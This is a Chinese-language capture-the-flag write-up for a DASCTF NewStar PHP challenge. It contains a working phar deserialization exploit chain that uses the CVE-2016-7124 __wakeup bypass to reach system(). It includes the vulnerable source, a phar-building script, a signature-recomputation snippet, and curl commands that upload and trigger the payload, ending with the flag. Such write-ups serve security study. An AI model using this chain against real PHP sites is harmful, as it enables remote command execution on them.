      <![CDATA[<h1 id="DASCTF-NewStar「雪梨」—-phar-反序列化-wakeup-绕过"><a href="#DASCTF-NewStar「雪梨」—-phar-反序列化-wakeup-绕过" class="headerlink" title="DASCTF NewStar「雪梨」— phar 反序列化 + __wakeup 绕过"></a>DASCTF NewStar「雪梨」— phar 反序列化 + __wakeup 绕过</h1><p><strong>目标</strong>：<code>http://41114b5a3e35c96852c80c18.http-ctf2.dasctf.com</code>（NewStarCTF 雪梨题）<br><strong>环境</strong>：openresty 反代 → Apache2 + <strong>PHP 7.0.9</strong>，CWD &#x3D; <code>/var/www/html</code>，运行身份 <code>www-data</code><br><strong>FLAG</strong>：<code>CTF2{6e35f438-78bf-42b2-9ad3-04c7a70458b5}</code>（文件在 <strong><code>/flllag</code></strong>，注意三个 l）</p><hr><h2 id="一、入口侦察"><a href="#一、入口侦察" class="headerlink" title="一、入口侦察"></a>一、入口侦察</h2><ul><li><code>index.php</code> 是个假上传页（”其实这次不是在这里上传”），但响应头下发：<br><code>Set-Cookie: looklook=pairing.php</code> ← <strong>真入口提示</strong></li><li>访问 <code>/pairing.php</code> 即题目本体（源码见下）。响应头 <code>X-Powered-By: PHP/7.0.9</code> 是关键指纹。</li></ul><h2 id="二、源码要点"><a href="#二、源码要点" class="headerlink" title="二、源码要点"></a>二、源码要点</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">story</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$user</span>=<span class="string">&#x27;admin&#x27;</span>;  <span class="keyword">public</span> <span class="variable">$pass</span>;  <span class="keyword">public</span> <span class="variable">$eating</span>;  <span class="keyword">public</span> <span class="variable">$God</span>=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123; <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;human&#x27;</span>; <span class="keyword">if</span>(<span class="number">1</span>==<span class="number">1</span>)&#123; <span class="keyword">die</span>(); &#125; &#125;   <span class="comment">// 拦截点</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123; <span class="variable language_">$this</span>-&gt;user=<span class="string">&#x27;AshenOne&#x27;</span>; <span class="variable language_">$this</span>-&gt;eating=<span class="string">&#x27;fire&#x27;</span>; <span class="keyword">die</span>(); &#125; <span class="comment">// 挡住 new</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123; <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;user.<span class="variable language_">$this</span>-&gt;pass; &#125;        <span class="comment">// 死代码</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123; <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;pass==<span class="string">&#x27;admin&#x27;</span>) <span class="keyword">echo</span> <span class="variable">$nothing</span>; &#125; <span class="comment">// 死代码</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123; <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;God==<span class="string">&#x27;true&#x27;</span>&amp;&amp;<span class="variable language_">$this</span>-&gt;user==<span class="string">&#x27;admin&#x27;</span>) <span class="title function_ invoke__">system</span>(<span class="variable">$this</span>-&gt;eating); <span class="keyword">else</span> <span class="keyword">die</span>(<span class="string">&#x27;Get Out!&#x27;</span>); &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$pear</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;pear&#x27;</span>]; <span class="variable">$Adam</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;apple&#x27;</span>];</span><br><span class="line">    <span class="variable">$file</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$pear</span>,<span class="title function_ invoke__">urldecode</span>(<span class="variable">$file</span>));   <span class="comment">// 任意文件写</span></span><br><span class="line">    <span class="title function_ invoke__">file_exists</span>(<span class="variable">$Adam</span>);                          <span class="comment">// 唯一反序列化触发点(phar://)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用链：<code>file_exists(&#39;phar://x.phar/...&#39;)</code> → 解析 phar manifest → <code>unserialize(metadata)</code> → <code>__destruct()</code> → <code>system($this-&gt;eating)</code></p><p>目标对象：<code>user=&#39;admin&#39;</code>(private, 序列化名 <code>\0story\0user</code>)、<code>eating=&lt;命令&gt;</code>、<code>God=&#39;true&#39;</code>。</p><h2 id="三、两个坎"><a href="#三、两个坎" class="headerlink" title="三、两个坎"></a>三、两个坎</h2><h3 id="坎-1：-wakeup-里的-die"><a href="#坎-1：-wakeup-里的-die" class="headerlink" title="坎 1：__wakeup() 里的 die()"></a>坎 1：<code>__wakeup()</code> 里的 <code>die()</code></h3><p><code>__wakeup</code> 无条件把 <code>user</code> 改成 <code>human</code> 再 <code>die()</code>。<br>→ 用 <strong>CVE-2016-7124</strong>：序列化串里<strong>声明的属性个数 &gt; 实际属性个数</strong>时跳过 <code>__wakeup</code>。<br>PHP 7.0.9 <strong>正好 &lt; 7.0.10</strong>（修复版本），可用。<br><code>O:5:&quot;story&quot;:4:{…}</code> → <code>O:5:&quot;story&quot;:5:{…}</code>（等长替换，偏移不变）</p><p>副作用：<code>file_exists()</code> 会报 <code>Notice: Unexpected end of serialized data</code>，<strong>无害</strong>，对象照样构造成功。</p><h3 id="坎-2：urldecode-file"><a href="#坎-2：urldecode-file" class="headerlink" title="坎 2：urldecode($file)"></a>坎 2：<code>urldecode($file)</code></h3><p>body 会过 <code>urldecode</code>，所以必须先 <code>urlencode(phar_bytes)</code> 再发（<code>urlencode</code>&#x2F;<code>urldecode</code> 严格互逆，二进制安全）。</p><h2 id="四、⭐-最大的坑：PHP-8-1-的-phar-签名格式（GBMB）"><a href="#四、⭐-最大的坑：PHP-8-1-的-phar-签名格式（GBMB）" class="headerlink" title="四、⭐ 最大的坑：PHP 8.1+ 的 phar 签名格式（GBMB）"></a>四、⭐ 最大的坑：PHP 8.1+ 的 phar 签名格式（GBMB）</h2><p>本机只有 PHP 8.5，用它生成 phar 时踩了两个大坑，<strong>排掉这两点才打通</strong>：</p><ol><li><p><strong>PHP 8.1+ 的尾部布局是 <code>[content][sig20][flags4][GBMB4]</code></strong>，比老格式多 4 字节 <code>GBMB</code> 魔术字。<br>我一开始”好心地”把 <code>GBMB</code> 剥掉、按 PHP5&#x2F;7 老格式 <code>[content][sig][flags]</code> 重建 → <strong>PHP 5.6.9 &#x2F; 7.3.4 全都报 <code>has a broken signature</code></strong>。<br><strong>实测结论：PHP 5.6&#x2F;7.x 反而能正常读 PHP 8.5 的原生输出（含 GBMB）。所以千万别手工降级格式。</strong></p><ul><li>PHP 8.5 自己读无 GBMB 的文件 → <code>has a broken signature</code>（8.1+ 强制要求 GBMB）</li><li>PHP 5.6.9 读带 GBMB 的原生文件 → <strong>OK</strong></li></ul></li><li><p><strong>签名必须重算</strong>：改一个字节（<code>4</code>→<code>5</code>）后，签名失效 → phar 直接被拒、静默不触发（<code>file_exists</code> 返回 false）。<br>重算方法（<strong>保持原生布局不变</strong>，只换哈希）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$patched</span>, <span class="number">0</span>, <span class="variable">$n</span> - <span class="number">28</span>);        <span class="comment">// 去掉 [sig20][flags4][GBMB4]</span></span><br><span class="line"><span class="variable">$tail</span>    = <span class="title function_ invoke__">substr</span>(<span class="variable">$patched</span>, <span class="variable">$n</span> - <span class="number">8</span>);            <span class="comment">// flags+GBMB 原样保留</span></span><br><span class="line"><span class="variable">$fixed</span>   = <span class="variable">$content</span> . <span class="title function_ invoke__">sha1</span>(<span class="variable">$content</span>, <span class="literal">true</span>) . <span class="variable">$tail</span>;</span><br></pre></td></tr></table></figure><p>对照实验（PHP 5.6.9）：</p><table><thead><tr><th>文件</th><th>构造</th><th>结果</th></tr></thead><tbody><tr><td>V1</td><td>属性数&#x3D;4 原样</td><td><code>Get Out!</code>（wakeup 执行了）</td></tr><tr><td>V2</td><td>属性数&#x3D;5 + 哈希重算</td><td>✅ <strong><code>system()</code> 执行</strong></td></tr><tr><td>V3</td><td>属性数&#x3D;5 + 哈希不动</td><td>无输出（签名校验失败）</td></tr></tbody></table></li></ol><h2 id="五、生成脚本要点"><a href="#五、生成脚本要点" class="headerlink" title="五、生成脚本要点"></a>五、生成脚本要点</h2><p><code>__construct</code> 里有 <code>die()</code>，<strong>不能用 <code>new story()</code></strong> 造对象，用反射绕：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rc</span> = <span class="keyword">new</span> <span class="title class_">ReflectionClass</span>(<span class="string">&#x27;story&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span>  = <span class="variable">$rc</span>-&gt;<span class="title function_ invoke__">newInstanceWithoutConstructor</span>();</span><br><span class="line"><span class="variable">$p</span>  = <span class="variable">$rc</span>-&gt;<span class="title function_ invoke__">getProperty</span>(<span class="string">&#x27;user&#x27;</span>); <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setAccessible</span>(<span class="literal">true</span>); <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">setValue</span>(<span class="variable">$o</span>,<span class="string">&#x27;admin&#x27;</span>);</span><br><span class="line"><span class="variable">$o</span>-&gt;pass=<span class="string">&#x27;admin&#x27;</span>; <span class="variable">$o</span>-&gt;eating=<span class="variable">$cmd</span>; <span class="variable">$o</span>-&gt;God=<span class="string">&#x27;true&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&#x27;base.phar&#x27;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&#x27;a.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>);                  <span class="comment">// 至少要一条记录</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setSignatureAlgorithm</span>(<span class="title class_">Phar</span>::<span class="variable constant_">SHA1</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>必须 <code>php -d phar.readonly=0</code>。</p><h2 id="六、发包"><a href="#六、发包" class="headerlink" title="六、发包"></a>六、发包</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1) 投放 phar（CWD=/var/www/html，相对路径就行）</span></span><br><span class="line">curl -s <span class="string">&quot;http://T/pairing.php?pear=exp.phar&amp;apple=1&quot;</span> --data-binary @V2.urlencoded</span><br><span class="line"><span class="comment"># 2) 触发</span></span><br><span class="line">curl -s <span class="string">&quot;http://T/pairing.php?pear=1&amp;apple=phar://exp.phar/a.txt&quot;</span> -X POST</span><br></pre></td></tr></table></figure><p><code>pear</code>&#x2F;<code>apple</code> 只要 isset 即可，<code>apple</code> 传 <code>phar://</code> 路径触发解析。</p><h2 id="七、⚠️-回显位置陷阱"><a href="#七、⚠️-回显位置陷阱" class="headerlink" title="七、⚠️ 回显位置陷阱"></a>七、⚠️ 回显位置陷阱</h2><p><code>system()</code> 的输出出现在响应里 <strong>高亮源码 <code>&lt;code&gt;…&lt;/code&gt;</code> 之前</strong>（PHP 输出缓冲顺序），<br>用 <code>sed -n &#39;/&lt;\/code&gt;/,$p&#39;</code> 过滤源码会<strong>把命令回显吃掉</strong>，表现为”时有时无”。<br><strong>正确做法：直接在原始响应里 <code>grep -o &#39;CTF2{[^}]*}&#39;</code></strong>。</p><h2 id="八、flag"><a href="#八、flag" class="headerlink" title="八、flag"></a>八、flag</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /flllag    <span class="comment"># -&gt; CTF2&#123;6e35f438-78bf-42b2-9ad3-04c7a70458b5&#125;</span></span><br></pre></td></tr></table></figure><h2 id="九、可复用的方法论"><a href="#九、可复用的方法论" class="headerlink" title="九、可复用的方法论"></a>九、可复用的方法论</h2><ol><li><strong>响应头&#x2F;Set-Cookie 常藏入口提示</strong>（本题 <code>looklook=pairing.php</code>）。</li><li><strong>phar 反序列化不需要 <code>unserialize()</code></strong>：任何走 <code>phar://</code> 的文件函数（<code>file_exists</code>&#x2F;<code>file_get_contents</code>&#x2F;<code>filesize</code>…）都会反序列化 metadata。</li><li><strong>本地有漏洞版 PHP 就能完整复现</strong>：本机 phpstudy 自带 PHP 5.6.9（&lt;5.6.25，同样可用 CVE-2016-7124），对照实验一次定位问题，比盲打靶机快得多。</li><li><strong>改 phar 字节必须重算签名</strong>（SHA1 覆盖 content），但<strong>不要改布局</strong>。</li><li><strong>PHP 7.0.9 是个甜点版本</strong>（phar 即时反序列化 + <code>__wakeup</code> 未修复）。</li></ol><p>相关：[[dasctf-phar-deser-upload-ctf-case]]（那道题踩的是”手改字节毁签名”）、[[tools-inventory-and-gotchas]]</p>]]>
    </content>
